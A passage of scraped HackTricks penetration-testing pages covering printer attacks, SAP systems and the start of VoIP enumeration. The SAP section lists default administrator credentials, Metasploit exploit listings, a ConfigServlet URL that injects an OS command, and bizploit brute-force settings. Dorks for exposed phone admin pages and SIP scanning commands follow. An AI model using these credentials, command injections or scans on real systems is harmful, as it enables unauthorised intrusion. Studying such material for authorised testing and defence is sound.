any\nSpool service listening\ninside the domain, you may be able to\nabuse\nis to\nobtain new credentials\nand\nescalate privileges\n.\nMore information about how to find a abuse Spooler services here.\n‚Äã\nPrivilege Escalation\nFactory Defaults\nThere are several possible ways to\nreset\na device to factory defaults, and this is a security-critical functionality as it\noverwrites protection mechanisms\nlike user-set passwords.\nLearn more here.\n‚Äã\nAccounting Bypass\nYou may be able to\nimpersonate existent or non-existent users\nto print pages using their accounts or\nmanipulate\nthe hardware or software\ncounter\nto be able to print more pages.\nLearn how to do it here.\n‚Äã\nScanner and Fax\nAccessing the Scanner of Fax functionalities you may be able to access other functionalities, but this all of this is vendor-dependent.\nLearn more here.\n‚Äã\nPrint job access\nPrint Job Retention\nJobs can be\nretained in memory\nand be\nprinted\nagain in a\nlater moment from the control panel\n, or using\nPostScript\nyou can even\nremotely access all the jobs that are going to be printed, download them\nand print them.\nLearn more here.\n‚Äã\nPrint Job Manipulation\nYou can\nadd new content\nto the pages that are printed,\nchange all the content\nthat is going to be printed or even\nreplace just certain letters or words.\nLearn how to do it here.\n‚Äã\nInformation Disclosure\nMemory access\nYou may be able to\ndump\nthe\nNVRAM\nmemory and\nextract sensitive\ninfo (like passwords) from there.\nRead how to do that here.\n‚Äã\nFile system access\nYou may be able to\naccess the file system\nabusing\nPJL\nor\nPostScript\n.\nRead how to do that here.\n‚Äã\nCredentials Disclosure/Brute-Force\nYou may be able to\ndisclosure the password\nbeing using abusing\nSNMP\nor the\nLDAP\nsettings or you could try to\nbrute-force PJL\nor\nPostScript\n.\nRead how to do that here\n.\nCode Execution\nBuffer Overflows\nSeveral\nbuffer overflows\nhave been\nfound\nalready in\nPJL input\nand in the\nLPD daemon\n, and there could be more.\nRead this for more information.\n‚Äã\nFirmware updates\nYou may be able to\nmake the printer update the driver to a malicious one\nspecially crafted by you.\nRead this for more information.\n‚Äã\nSoftware Packages\nprinter vendors have started to introduce the\npossibility to install custom software on their devices\nbut information is not publicly available. The feature of writing customized software which runs on printers was intended and is reserved for resellers and contractors.\nRead more about this here.\n‚Äã\nDenial of service\nTransmission channel\nOccupying all the\nconnections\nand\nincreasing\nthe\ntimeout\nof the server could lead to a DoS.\nLearn more about this here.\n‚Äã\nDocument Processing\nYou can use\nPostScript\nand\nPJL\nto perform\ninfinite loops\n,\nredefine commands\nto avoid any printing,\nturn off\nany printing functionality or even\nset the printer in offline mode\n.\nLearn more about this here.\n‚Äã\nPhysical damage\nOne could\nabuse PJL\nor\nPostScript\nto\nwrite\nin the\nNVRAM\nhundreds of thousands of times with the goal of\nbreaking the chip\nor at least make the\nparameters be frozen\nintro the factory default ones.\nLearn more about this here.\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\nPentesting JDWP - Java Debug Wire Protocol\nNext\nAccounting bypass\nLast modified\n6mo ago"
    },
    {
        "title": "Pentesting SAP",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-sap",
        "text": "Pentesting SAP\n‚Äã\n\u0000‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nIntroduction about SAP\nSAP stands for Systems Applications and Products in Data Processing. SAP, by definition, is also the name of the ERP (Enterprise Resource Planning) software as well as the name of the company.\nSAP system consists of a number of fully integrated modules, which covers virtually every aspect of business management.\nEach SAP instance (or SID) is composed of three layers: database, application and presentation), each landscape usually consists of four instances: dev, test, QA and production.\nEach of the layers can be exploited to some extent, but most effect can be gained by\nattacking the database\n.\nEach SAP instance is divided into clients. Each one has a user SAP*, the application‚Äôs equivalent of ‚Äúroot‚Äù.\nUpon initial creation, this user SAP* gets a default password: ‚Äú060719992‚Äù (more default password below).\nYou‚Äôd be surprised if you knew how often these\npasswords aren‚Äôt changed in test or dev environments\n!\nTry to get access to the shell of any server using username <SID>adm.\nBruteforcing can help, whoever there can be Account Lockout mechanism.\nDiscovery\nNext section is mostly from\nhttps://github.com/shipcod3/mySapAdventures\nfrom user shipcod3!\nCheck the Application Scope or Program Brief for testing. Take note of the hostnames or system instances for connecting to SAP GUI.\nUse OSINT (open source intelligence), Shodan and Google Dorks to check for files, subdomains, and juicy information if the application is Internet-facing or public:\ninurl:50000/irj/portal\ninurl:IciEventService/IciEventConf\ninurl:/wsnavigator/jsps/test.jsp\ninurl:/irj/go/km/docs/\nhttps://www.shodan.io/search?query=sap+portal\nhttps://www.shodan.io/search?query=SAP+Netweaver\nhttps://www.shodan.io/search?query=SAP+J2EE+Engine\nHere is what\nhttp://SAP:50000/irj/portal\nlooks like\nSAP Logon screen\nUse nmap to check for open ports and known services (sap routers, webdnypro, web services, web servers, etc.)\nCrawl the URLs if there is a web server running.\nFuzz the directories (you can use Burp Intruder) if it has web servers on certain ports. Here are some good wordlists provided by the SecLists Project for finding default SAP ICM Paths and other interesting directories or files:\n‚Äã\nhttps://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/URLs/urls_SAP.txt\nhttps://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/SAP.fuzz.txt\nhttps://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/sap.txt\n‚Äã\nUse the SAP SERVICE DISCOVERY auxiliary Metasploit module for enumerating SAP instances/services/components:\nmsf > use auxiliary/scanner/sap/sap_service_discovery\nmsf auxiliary(sap_service_discovery) > show options\nModule options (auxiliary/scanner/sap/sap_service_discovery):\nName         Current Setting  Required  Description\n----         ---------------  --------  -----------\nCONCURRENCY  10               yes       The number of concurrent ports to check per host\nINSTANCES    00-01            yes       Instance numbers to scan (e.g. 00-05,00-99)\nRHOSTS                        yes       The target address range or CIDR identifier\nTHREADS      1                yes       The number of concurrent threads\nTIMEOUT      1000             yes       The socket connect timeout in milliseconds\nmsf auxiliary(sap_service_discovery) > set rhosts 192.168.96.101\nrhosts => 192.168.96.101\nmsf auxiliary(sap_service_discovery) > run\n[*] 192.168.96.101:       - [SAP] Beginning service Discovery '192.168.96.101'\nTesting the Thick Client / SAP GUI\nHere is the command to connect to SAP GUI\nsapgui <sap server hostname> <system number>\nCheck for default credentials (In Bugcrowd‚Äôs Vulnerability Rating Taxonomy, this is considered as P1 -> Server Security Misconfiguration | Using Default Credentials | Production Server):\n# SAP* - High privileges - Hardcoded kernel user\nSAP*:06071992:*\nSAP*:PASS:*\n# IDEADM - High Privileges - Only in IDES systems\nIDEADM:admin:*\n# DDIC - High privileges - User has SAP_ALL\nDDIC:19920706:000,001\n# EARLYWATCH - High privileges\nEARLYWATCH:SUPPORT:066\n# TMSADM - Medium privileges\nTMSADM:PASSWORD:000\nTMSADM:$1Pawd2&:000\n# SAPCPIC - Medium privileges\nSAPCPIC:ADMIN:000,001\n# SOLMAN dialog default users and passwords.\n# For more info check:\n# https://www.troopers.de/media/filer_public/37/34/3734ebb3-989c-4750-9d48-ea478674991a/an_easy_way_into_your_sap_systems_v30.pdf\n# https://launchpad.support.sap.com/#/notes/2293011\n# SOLMAN_ADMIN - High privileges - Only on SOLMAN systems\nSOLMAN_ADMIN:init1234:*\n# SAPSUPPORT - High privileges - Only on SOLMAN or satellite systems\nSAPSUPPORT:init1234:*\n# SOLMAN<SID><CLNT> - High privileges - Only on SOLMAN systems\n#SOLMAN<SID><CLNT>:init1234:*\n# Trial systems\n# -------------\n# AS ABAP 7.40 SP08 Developer Edition:\n# https://blogs.sap.com/2015/10/14/sap-netweaver-as-abap-740-sp8-developer-edition-to-download-consise-installation-instruction/\nDDIC:DidNPLpw2014:001\nSAP*:DidNPLpw2014:001\nDEVELOPER:abCd1234:001\nBWDEVELOPER:abCd1234:001\n# AS ABAP 7.50 SP02 Developer Edition:\n# https://blogs.sap.com/2016/11/03/sap-nw-as-abap-7.50-sp2-developer-edition-to-download-consise-installation-guide/\n# AS ABAP 7.51 SP02 Developer Edition:\n# https://blogs.sap.com/2017/09/04/sap-as-abap-7.51-sp2-developer-edition-to-download-concise-installation-guide/\nDDIC:Appl1ance:000,001\nSAP*:Appl1ance:000,001\nDEVELOPER:Appl1ance:001\nBWDEVELOPER:Appl1ance:001\n# AS ABAP 7.51 SP01 Developer Edition:\n# https://blogs.sap.com/2018/09/13/as-abap-7.52-sp01-developer-edition-concise-installation-guide/\n# AS ABAP 7.52 SP04 Developer Edition:\n# https://blogs.sap.com/2019/10/01/as-abap-7.52-sp04-developer-edition-concise-installation-guide/\nDDIC:Down1oad:000,001\nSAP*:Down1oad:000,001\nDEVELOPER:Down1oad:001\nBWDEVELOPER:Down1oad:001\nRun Wireshark then authenticate to the client (SAP GUI) using the credentials you got because some clients transmit credentials without SSL. There are two known plugins for Wireshark that can dissect the main headers used by the SAP DIAG protocol too: SecureAuth Labs SAP dissection plug-in and SAP DIAG plugin by Positive Research Center.\nCheck for privilege escalations like using some SAP Transaction Codes (tcodes) for low-privilege users:\nSU01 - To create and maintain the users\nSU01D - To Display Users\nSU10 - For mass maintenance\nSU02 - For Manual creation of profiles\nSM19 - Security audit - configuration\nSE84 - Information System for SAP R/3 Authorizations\nCheck if you can execute system commands / run scripts in the client.\nCheck if you can do XSS on BAPI Explorer\nTesting the web interface\nCrawl the URLs (see discovery phase).\nFuzz the URLs like in the discovery phase. Here is what\nhttp://SAP:50000/index.html\nlooks like:\nSAP Index Page\nLook for common web vulnerabilities (Refer to OWASP Top 10) because there are XSS, RCE, XXE, etc. vulnerabilities in some places.\nCheck out Jason Haddix‚Äôs\n‚ÄúThe Bug Hunters Methodology‚Äù\nfor testing web vulnerabilities.\nAuth Bypass via verb Tampering? Maybe :)\nOpen\nhttp://SAP:50000/webdynpro/resources/sap.com/XXX/JWFTestAddAssignees#\nthen hit the ‚ÄúChoose‚Äù Button and then in the opened window press ‚ÄúSearch‚Äù. You should be able to see a list of SAP users (Vulnerability Reference:\nERPSCAN-16-010\n)\nAre the credentials submitted over HTTP? If it is then it is considered as P3 based on Bugcrowd‚Äôs\nVulnerability Rating Taxonomy\n: Broken Authentication and Session Management | Weak Login Function Over HTTP. Hint: Check out\nhttp://SAP:50000/startPage\ntoo or the logon portals :)\nSAP Start Page\nTry\n/irj/go/km/navigation/\nfor possible directory listing or authentication bypass\n‚Äã\nhttp://SAP/sap/public/info\ncontains some juicy information:\n<\nSOAP-ENV:\nEnvelope\nxmlns:\nSOAP-ENV\n=\n\"\nhttp://schemas.xmlsoap.org/soap/envelope/\n\"\n>\n<\nSOAP-ENV:\nBody\n>\n<\nrfc:\nRFC_SYSTEM_INFO.Response\nxmlns:\nrfc\n=\n\"\nurn:sap-com:document:sap:rfc:functions\n\"\n>\n<\nRFCSI\n>\n<\nRFCPROTO\n>\n011\n</\nRFCPROTO\n>\n<\nRFCCHARTYP\n>\n4102\n</\nRFCCHARTYP\n>\n<\nRFCINTTYP\n>\nBIG\n</\nRFCINTTYP\n>\n<\nRFCFLOTYP\n>\nIE3\n</\nRFCFLOTYP\n>\n<\nRFCDEST\n>\nrandomnum\n</\nRFCDEST\n>\n<\nRFCHOST\n>\nrandomnum\n</\nRFCHOST\n>\n<\nRFCSYSID\n>\nBRQ\n</\nRFCSYSID\n>\n<\nRFCDATABS\n>\nBRQ\n</\nRFCDATABS\n>\n<\nRFCDBHOST\n>\nrandomnum\n</\nRFCDBHOST\n>\n<\nRFCDBSYS\n>\nORACLE\n</\nRFCDBSYS\n>\n<\nRFCSAPRL\n>\n740\n</\nRFCSAPRL\n>\n<\nRFCMACH\n>\n324\n</\nRFCMACH\n>\n<\nRFCOPSYS\n>\nAIX\n</\nRFCOPSYS\n>\n<\nRFCTZONE\n>\n-25200\n</\nRFCTZONE\n>\n<\nRFCDAYST\n/>\n<\nRFCIPADDR\n>\n192.168.1.8\n</\nRFCIPADDR\n>\n<\nRFCKERNRL\n>\n749\n</\nRFCKERNRL\n>\n<\nRFCHOST2\n>\nrandomnum\n</\nRFCHOST2\n>\n<\nRFCSI_RESV\n/>\n<\nRFCIPV6ADDR\n>\n192.168.1.8\n</\nRFCIPV6ADDR\n>\n</\nRFCSI\n>\n</\nrfc:\nRFC_SYSTEM_INFO.Response\n>\n</\nSOAP-ENV:\nBody\n>\n</\nSOAP-ENV:\nEnvelope\n>\nAttack!\nCheck if it runs on old servers or technologies like Windows 2000.\nPlan the possible exploits / attacks, there are a lot of Metasploit modules for SAP discovery (auxiliary modules) and exploits:\nmsf > search sap\nMatching Modules\n================\nName                                                                     Disclosure Date  Rank       Description\n----                                                                     ---------------  ----       -----------\nauxiliary/admin/maxdb/maxdb_cons_exec                                    2008-01-09       normal     SAP MaxDB cons.exe Remote Command Injection\nauxiliary/admin/sap/sap_configservlet_exec_noauth                        2012-11-01       normal     SAP ConfigServlet OS Command Execution\nauxiliary/admin/sap/sap_mgmt_con_osexec                                                   normal     SAP Management Console OSExecute\nauxiliary/dos/sap/sap_soap_rfc_eps_delete_file                                            normal     SAP SOAP EPS_DELETE_FILE File Deletion\nauxiliary/dos/windows/http/pi3web_isapi                                  2008-11-13       normal     Pi3Web ISAPI DoS\nauxiliary/dos/windows/llmnr/ms11_030_dnsapi                              2011-04-12       normal     Microsoft Windows DNSAPI.dll LLMNR Buffer Underrun DoS\nauxiliary/scanner/http/sap_businessobjects_user_brute                                     normal     SAP BusinessObjects User Bruteforcer\nauxiliary/scanner/http/sap_businessobjects_user_brute_web                                 normal     SAP BusinessObjects Web User Bruteforcer\nauxiliary/scanner/http/sap_businessobjects_user_enum                                      normal     SAP BusinessObjects User Enumeration\nauxiliary/scanner/http/sap_businessobjects_version_enum                                   normal     SAP BusinessObjects Version Detection\nauxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt                                    normal     SAP CTC Service Verb Tampering User Management\nauxiliary/scanner/sap/sap_hostctrl_getcomputersystem                                      normal     SAP Host Agent Information Disclosure\nauxiliary/scanner/sap/sap_icf_public_info                                                 normal     SAP ICF /sap/public/info Service Sensitive Information Gathering\nauxiliary/scanner/sap/sap_icm_urlscan                                                     normal     SAP URL Scanner\nauxiliary/scanner/sap/sap_mgmt_con_abaplog                                                normal     SAP Management Console ABAP Syslog Disclosure\nauxiliary/scanner/sap/sap_mgmt_con_brute_login                                            normal     SAP Management Console Brute Force\nauxiliary/scanner/sap/sap_mgmt_con_extractusers                                           normal     SAP Management Console Extract Users\nauxiliary/scanner/sap/sap_mgmt_con_getaccesspoints                                        normal     SAP Management Console Get Access Points\nauxiliary/scanner/sap/sap_mgmt_con_getenv                                                 normal     SAP Management Console getEnvironment\nauxiliary/scanner/sap/sap_mgmt_con_getlogfiles                                            normal     SAP Management Console Get Logfile\nauxiliary/scanner/sap/sap_mgmt_con_getprocesslist                                         normal     SAP Management Console GetProcessList\nauxiliary/scanner/sap/sap_mgmt_con_getprocessparameter                                    normal     SAP Management Console Get Process Parameters\nauxiliary/scanner/sap/sap_mgmt_con_instanceproperties                                     normal     SAP Management Console Instance Properties\nauxiliary/scanner/sap/sap_mgmt_con_listlogfiles                                           normal     SAP Management Console List Logfiles\nauxiliary/scanner/sap/sap_mgmt_con_startprofile                                           normal     SAP Management Console getStartProfile\nauxiliary/scanner/sap/sap_mgmt_con_version                                                normal     SAP Management Console Version Detection\nauxiliary/scanner/sap/sap_router_info_request                                             normal     SAPRouter Admin Request\nauxiliary/scanner/sap/sap_router_portscanner                                              normal     SAPRouter Port Scanner\nauxiliary/scanner/sap/sap_service_discovery                                               normal     SAP Service Discovery\nauxiliary/scanner/sap/sap_smb_relay                                                       normal     SAP SMB Relay Abuse\nauxiliary/scanner/sap/sap_soap_bapi_user_create1                                          normal     SAP /sap/bc/soap/rfc SOAP Service BAPI_USER_CREATE1 Function User Creation\nauxiliary/scanner/sap/sap_soap_rfc_brute_login                                            normal     SAP SOAP Service RFC_PING Login Brute Forcer\nauxiliary/scanner/sap/sap_soap_rfc_dbmcli_sxpg_call_system_command_exec                   normal     SAP /sap/bc/soap/rfc SOAP Service SXPG_CALL_SYSTEM Function Command Injection\nauxiliary/scanner/sap/sap_soap_rfc_dbmcli_sxpg_command_exec                               normal     SAP /sap/bc/soap/rfc SOAP Service SXPG_COMMAND_EXEC Function Command Injection\nauxiliary/scanner/sap/sap_soap_rfc_eps_get_directory_listing                              normal     SAP SOAP RFC EPS_GET_DIRECTORY_LISTING Directories Information Disclosure\nauxiliary/scanner/sap/sap_soap_rfc_pfl_check_os_file_existence                            normal     SAP SOAP RFC PFL_CHECK_OS_FILE_EXISTENCE File Existence Check\nauxiliary/scanner/sap/sap_soap_rfc_ping                                                   normal     SAP /sap/bc/soap/rfc SOAP Service RFC_PING Function Service Discovery\nauxiliary/scanner/sap/sap_soap_rfc_read_table                                             normal     SAP /sap/bc/soap/rfc SOAP Service RFC_READ_TABLE Function Dump Data\nauxiliary/scanner/sap/sap_soap_rfc_rzl_read_dir                                           normal     SAP SOAP RFC RZL_READ_DIR_LOCAL Directory Contents Listing\nauxiliary/scanner/sap/sap_soap_rfc_susr_rfc_user_interface                                normal     SAP /sap/bc/soap/rfc SOAP Service SUSR_RFC_USER_INTERFACE Function User Creation\nauxiliary/scanner/sap/sap_soap_rfc_sxpg_call_system_exec                                  normal     SAP /sap/bc/soap/rfc SOAP Service SXPG_CALL_SYSTEM Function Command Execution\nauxiliary/scanner/sap/sap_soap_rfc_sxpg_command_exec                                      normal     SAP SOAP RFC SXPG_COMMAND_EXECUTE\nauxiliary/scanner/sap/sap_soap_rfc_system_info                                            normal     SAP /sap/bc/soap/rfc SOAP Service RFC_SYSTEM_INFO Function Sensitive Information Gathering\nauxiliary/scanner/sap/sap_soap_th_saprel_disclosure                                       normal     SAP /sap/bc/soap/rfc SOAP Service TH_SAPREL Function Information Disclosure\nauxiliary/scanner/sap/sap_web_gui_brute_login                                             normal     SAP Web GUI Login Brute Forcer\nexploit/multi/sap/sap_mgmt_con_osexec_payload                            2011-03-08       excellent  SAP Management Console OSExecute Payload Execution\nexploit/multi/sap/sap_soap_rfc_sxpg_call_system_exec                     2013-03-26       great      SAP SOAP RFC SXPG_CALL_SYSTEM Remote Command Execution\nexploit/multi/sap/sap_soap_rfc_sxpg_command_exec                         2012-05-08       great      SAP SOAP RFC SXPG_COMMAND_EXECUTE Remote Command Execution\nexploit/windows/browser/enjoysapgui_comp_download                        2009-04-15       excellent  EnjoySAP SAP GUI ActiveX Control Arbitrary File Download\nexploit/windows/browser/enjoysapgui_preparetoposthtml                    2007-07-05       normal     EnjoySAP SAP GUI ActiveX Control Buffer Overflow\nexploit/windows/browser/sapgui_saveviewtosessionfile                     2009-03-31       normal     SAP AG SAPgui EAI WebViewer3D Buffer Overflow\nexploit/windows/http/sap_configservlet_exec_noauth                       2012-11-01       great      SAP ConfigServlet Remote Code Execution\nexploit/windows/http/sap_host_control_cmd_exec                           2012-08-14       average    SAP NetWeaver HostControl Command Injection\nexploit/windows/http/sapdb_webtools                                      2007-07-05       great      SAP DB 7.4 WebTools Buffer Overflow\nexploit/windows/lpd/saplpd                                               2008-02-04       good       SAP SAPLPD 6.28 Buffer Overflow\nexploit/windows/misc/sap_2005_license                                    2009-08-01       great      SAP Business One License Manager 2005 Buffer Overflow\nexploit/windows/misc/sap_netweaver_dispatcher                            2012-05-08       normal     SAP NetWeaver Dispatcher DiagTraceR3Info Buffer Overflow\nTry to use some known exploits (check out Exploit-DB) or attacks like the old but goodie ‚ÄúSAP ConfigServlet Remote Code Execution‚Äù in the SAP Portal:\nhttp://example.com:50000/ctc/servlet/com.sap.ctc.util.ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=uname -a\nSAP Config Servlet RCE\nBefore running the\nstart\ncommand on the bizploit script at the Discovery phase, you can also add the following for performing vulnerability assessment:\nbizploit> plugins\nbizploit/plugins> vulnassess all\nbizploit/plugins> vulnassess config bruteLogin\nbizploit/plugins/vulnassess/config:bruteLogin> set type defaultUsers\nbizploit/plugins/vulnassess/config:bruteLogin> set tryHardcodedSAPStar True\nbizploit/plugins/vulnassess/config:bruteLogin> set tryUserAsPwd True\nbizploit/plugins/vulnassess/config:bruteLogin> back\nbizploit/plugins> vulnassess config registerExtServer\nbizploit/plugins/vulnassess/config:registerExtServer> set tpname evilgw\nbizploit/plugins/vulnassess/config:registerExtServer> back\nbizploit/plugins> vulnassess config checkRFCPrivs\nbizploit/plugins/vulnassess/config:checkRFCPrivs> set checkExtOSCommands True\nbizploit/plugins/vulnassess/config:checkRFCPrivs> back\nbizploit/plugins> vulnassess config icmAdmin\nbizploit/plugins/vulnassess/config:icmAdmin> set adminURL /sap/admin\nbizploit/plugins/vulnassess/config:icmAdmin> back\nbizploit/plugins> start\nbizploit/plugins> back\nbizploit> start\nOther Useful Tools for Testing\n‚Äã\nPowerSAP\n- Powershell tool to assess sap security\n‚Äã\nBurp Suite\n- a must have for directory fuzzing and web security assessments\n‚Äã\npysap\n- Python library to craft SAP network protocol packets\n‚Äã\nhttps://github.com/gelim/nmap-erpscan\n- Help nmap to detect SAP/ERP\nReferences\n‚Äã\nSAP Penetration Testing Using Metasploit\n‚Äã\n‚Äã\nhttps://github.com/davehardy20/SAP-Stuff\n- a script to semi-automate Bizploit\n‚Äã\nSAP NetWeaver ABAP security configuration part 3: Default passwords for access to the application\n‚Äã\n‚Äã\nList of ABAP-transaction codes related to SAP security\n‚Äã\n‚Äã\nBreaking SAP Portal\n‚Äã\n‚Äã\nTop 10 most interesting SAP vulnerabilities and attacks\n‚Äã\n‚Äã\nAssessing the security of SAP ecosystems with bizploit: Discovery\n‚Äã\n‚Äã\nhttps://www.exploit-db.com/docs/43859\n‚Äã\n‚Äã\nhttps://resources.infosecinstitute.com/topic/pen-stesting-sap-applications-part-1/\n‚Äã\n‚Äã\nhttps://github.com/shipcod3/mySapAdventures\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nScanner and Fax\nNext\n- Network Services Pentesting\nPentesting VoIP\nLast modified\n6mo ago"
    },
    {
        "title": "Pentesting VoIP",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-voip",
        "text": "Pentesting VoIP\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nVoIP Basic Information\nTo start learning about how VoIP works check:\nBasic VoIP Protocols\nVoIP Enumeration\nTelephone Numbers\nOne of the first steps a Red Team could do is to search available phone numbers to contact with the company using OSINT tools, Google Searches or scraping the web pages.\nOnce you have the telephone numbers you could use online services to identify the operator:\n‚Äã\nhttps://www.numberingplans.com/?page=analysis&sub=phonenr\n‚Äã\n‚Äã\nhttps://mobilenumbertracker.com/\n‚Äã\n‚Äã\nhttps://www.whitepages.com/\n‚Äã\n‚Äã\nhttps://www.twilio.com/lookup\n‚Äã\nKnowing if the operator provides VoIP services you could identify if the company is using VoIP... Moreover, it's possible that the company hasn't hired VoIP services but is using PSTN cards to connect it's own VoIP PBX to the traditional telephony network.\nThings such as automated responses of music usually indicates that VoIP is being used.\nGoogle Dorks\n# Grandstream phones\nintitle:\n\"Grandstream Device Configuration\"\nPassword\nintitle:\n\"Grandstream Device Configuration\"\n(\nintext:password\n&\nintext:\n\"Grandstream Device Configuration\"\n&\nintext:\n\"Grandstream Networks\"\n|\ninurl:cgi-bin\n)\n-.com\n|\norg\n‚Äã\n# Cisco Callmanager\ninurl:\n\"ccmuser/logon.asp\"\nintitle:\n\"Cisco CallManager User Options Log On\"\n\"Please enter your User ID and Password in the spaces provided below and click the Log On button\"\n‚Äã\n# Cisco phones\ninurl:\n\"NetworkConfiguration\"\ncisco\n‚Äã\n# Linksys phones\nintitle:\n\"Sipura SPA Configuration\"\n‚Äã\n# Snom phones\nintitle:\n\"snom\"\nintext:\n\"Welcome to Your Phone!\"\ninurl:line_login.htm\n‚Äã\n# Polycom SoundPoint IP & phones\nintitle:\n\"SoundPoint IP Configuration Utility - Registration\"\n\"Welcome to Polycom Web Configuration Utility\"\n\"Login as\"\n\"Password\"\nintext:\n\"Welcome to Polycom Web Configuration Utility\"\nintitle:\n\"Polycom - Configuration Utility\"\ninurl:\n\"coreConf.htm\"\nintitle:\n\"Polycom Login\"\ninurl:\n\"/login.html\"\nintitle:\n\"Polycom Login\"\n-.com\n‚Äã\n# Elastix\nintitle:\n\"Elastix - Login page\"\nintext:\n\"Elastix is licensed under GPL\"\n‚Äã\n# FreePBX\ninurl:\n\"maint/index.php?FreePBX\"\nintitle:\n\"FreePBX\"\nintext:\n\"FreePBX Admministration\"\nOSINT information\nAny other OSINT enumeration that helps to identify VoIP software being used will be helpful for a Red Team.\nNetwork Enumeration\nnmap\nis capable of scanning UDP services, but because of the number of UDP services being scanned, it's very slow and might not be very accurate with this kind of services.\nsvmap\nfrom SIPVicious (\nsudo apt install sipvicious\n): Will locate SIP services in the indicated network.\nsvmap\nis\neasy to block\nbecause it uses the User-Agent\nfriendly-scanner\n, but you could modify the code from\n/usr/share/sipvicious/sipvicious\nand change it.\n# Use --fp to fingerprint the services\nsvmap\n10.10\n.0.0/24\n-p\n5060\n-5070\n[\n--fp\n]\nsipscan.py\nfrom\nsippts\n:\nSipscan is a very fast scanner for SIP services over UDP, TCP or TLS. It uses multithread and can scan large ranges of networks. It allows to easily indicate a port range, scan both TCP & UDP, use another method (by default it will use OPTIONS) and specify a different User-Agent (and more).\n./sipscan.py\n-i\n10.10\n.0.0/24\n-p\nall\n-r\n5060\n-5080\n-th\n200\n-ua\nCisco\n[\n-m REGISTER\n]\n‚Äã\n[\n!\n]\nIP/Network:\n10.10\n.0.0/24\n[\n!\n]\nPort range:\n5060\n-5080\n[\n!\n]\nProtocol: UDP, TCP, TLS\n[\n!\n]\nMethod to scan: REGISTER\n[\n!\n]\nCustomized User-Agent: Cisco\n[\n!\n]\nUsed threads:\n200\n‚Äã\nmetasploit\n:\nauxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)\nauxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)\nExtra Network Enumeration\nThe PBX could also be exposing other network services such as:\n69/UDP (TFTP)\n: Firmware updates\n80 (HTTP) / 443 (HTTPS)\n: To manage the device from the web\n389 (LDAP)\n: Alternative to store the users information\n3306 (MySQL\n): MySQL database\n5038 (Manager)\n: Allows to use Asterisk from other platforms\n5222 (XMPP)\n: Messages using Jabber\n5432 (PostgreSQL)\n: PostgreSQL database\nAnd others...\nMethods Enumeration\nIt's possible to find\nwhich methods are available\nto use in the PBX using\nsipenumerate.py\nfrom\nsippts\n‚Äã\npython3 sipenumerate.py\n-i\n10.10\n.0.10\n-r\n5080\nExtension Enumeration\nExtensions in a PBX (Private Branch Exchange) system refer to the\nunique internal identifiers assigned to individual\nphone lines, devices, or users within an organization or business. Extensions make it possible to\nroute calls within the organization efficiently\n, without the need for individual external phone numbers for each user or device.\nsvwar\nfrom SIPVicious (\nsudo apt install sipvicious\n):\nsvwar\nis a free SIP PBX extension line scanner. In concept it works similar to traditional wardialers by\nguessing a range of extensions or a given list of 